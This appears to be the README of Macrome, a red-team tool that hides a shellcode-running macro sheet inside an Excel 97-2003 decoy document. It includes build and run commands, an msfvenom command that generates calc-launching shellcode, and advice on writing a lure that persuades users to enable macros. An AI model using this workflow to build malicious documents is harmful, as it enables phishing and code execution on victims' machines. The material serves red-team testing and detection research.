# Macrome
An Excel Macro Document Reader/Writer for Red Teamers & Analysts.

# Installation / Building
Clone or download this repository, the tool can then be executed using dotnet - for example:

~~~
dotnet run -- --decoy-document Docs\decoy_document.xls --payload Docs\popcalc.bin
~~~

or 

~~~
dotnet build
cd bin/Debug/netcoreapp2.0
dotnet Macrome.dll --decoy-document decoy_document.xls --payload popcalc.bin
~~~

# Usage
Run Macrome by either using `dotnet run` from the solution directory, or `dotnet` against the built Macrome binary. 
~~~
Macrome:
  Generate an Excel Document with a hidden macro sheet that will execute code described by the payload argument.

Usage:
  Macrome [options]

Options:
  --decoy-document <decoy-document>          File path to the base Excel 2003 sheet that should be visible to users.
  --payload <payload>                        Either binary shellcode or a newline separated list of Excel Macros to execute
  --payload-type <Macro|Shellcode>           Specify if the payload is binary shellcode or a macro list. Defaults to Shellcode
  --macro-sheet-name <macro-sheet-name>      The name that should be used for the macro sheet. Defaults to Sheet2
  --output-sheet-name <output-sheet-name>    The output filename used for the generated document. Defaults to output.xls
  --debug-mode                               Set this to true to make the program wait for a debugger to attach. Defaults to false
  --version                                  Show version information
  -?, -h, --help                             Show help and usage information
~~~

## Binary Payload Usage
First generate a base "decoy" Excel document that will contain content users should see. This should be some sort of lure that convinces users to click the "Enable Macros" button displayed in Excel. There's some examples of the "latest and greatest" lure creation at https://inquest.net/blog/2020/05/06/ZLoader-4.0-Macrosheets-. Once this sheet is created, save the document as type `Excel 97-2003 Workbook (*.xls)` rather than the newer `Excel Workbook (*.xlsx)` format. An example decoy document is included in `/Docs/decoy_document.xls`.

Next, generate a shellcode payload to provide to the tool. The example binary payload (which pops calc) was generated using `msfvenom` using the following parameters:

~~~
 msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
~~~

Note that using a majority alpha-numeric payload will reduce the size of the macro file generated since it's easier to express letters and numbers in macro form instead of appending `CHAR` function invocations repeatedly like `=CHAR(123)&CHAR(124)&CHAR(125)...` etc. But the tool should be able to handle a completely unprintable binary payload as well.

Currently this will only work with `x86` payloads, but `x64` support is coming soon, along with support for loading .NET binaries.

## Macro Payload Usage
Technically possible, but there's more work to do on this both implementation and documentation side.

# Acknowledgements 
Big thanks to all the shoulders that I was able to stand on in order to write this.

* https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/ - The Outflank team created this attack, I'm just automating some of the tedious parts.
* The folks at InQuest for their excellent write-ups on what malware authors are doing to evade detection right now.
  * https://inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files
  * https://inquest.net/blog/2020/03/18/Getting-Sneakier-Hidden-Sheets-Data-Connections-and-XLM-Macros
  * https://inquest.net/blog/2020/05/06/ZLoader-4.0-Macrosheets-
* [@DissectMalware](https://twitter.com/DissectMalware/) for their killer [XLMMacroDeobfuscator](https://github.com/DissectMalware/XLMMacroDeobfuscator) tool which has been awesome to test against and is just a really great piece of tech if you're on the defense/analyst side.
* The original authors of the `b2xtranslator` library as well as the folks at EvolutionJobs who updated it and ported it to dotnet. The code used here was initially sourced from https://github.com/EvolutionJobs/b2xtranslator.
